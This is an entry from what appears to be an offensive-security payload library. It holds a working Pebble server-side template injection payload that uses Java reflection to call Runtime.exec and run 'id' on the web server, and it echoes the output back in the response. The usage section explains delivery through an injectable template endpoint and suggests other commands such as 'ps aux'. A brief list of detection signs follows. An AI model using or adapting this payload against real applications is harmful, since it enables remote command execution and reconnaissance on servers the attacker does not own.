---
type: code
language: java
verified: true
created_at: '2023-04-06T03:56:40.140956+00:00'
updated_at: '2023-04-10T20:23:38.900029+00:00'
platforms:
  - Web
  - Java
  - Linux
tags:
  - SSTI
  - Pebble
  - RCE
  - Discovery
validated: true
---

# Pebble-SSTI-Get-Current-User-ID

## Code

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

## Description

This advanced Pebble SSTI payload executes a shell command to retrieve the current user ID and group information by invoking Java's Runtime.exec(), reading the output stream as bytes, and converting it to a renderable string. It targets discovery of the web application's execution context for privilege assessment.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_COMMAND | The shell command to execute (set in the 'cmd' variable) | `id` |

## Usage

Deliver via an injectable template endpoint in a Pebble application. The payload sets the command, executes it, captures the output, and displays it directly in the response. Useful for determining if the app runs as a privileged user; extend by changing 'id' to 'whoami' or 'ps aux' for broader system info.

## Detection

- Logs indicating byte stream reads from Runtime.exec() processes or string constructions from command outputs.
- Response content containing user ID strings like 'uid=...' from non-authenticated endpoints.
- Behavioral anomalies: web server processes spawning 'id' commands; use EDR tools to monitor child processes from Java apps.

## Related

- [[procedures/Pebble-Server-Side-Template-Injection-Code-Execution]]
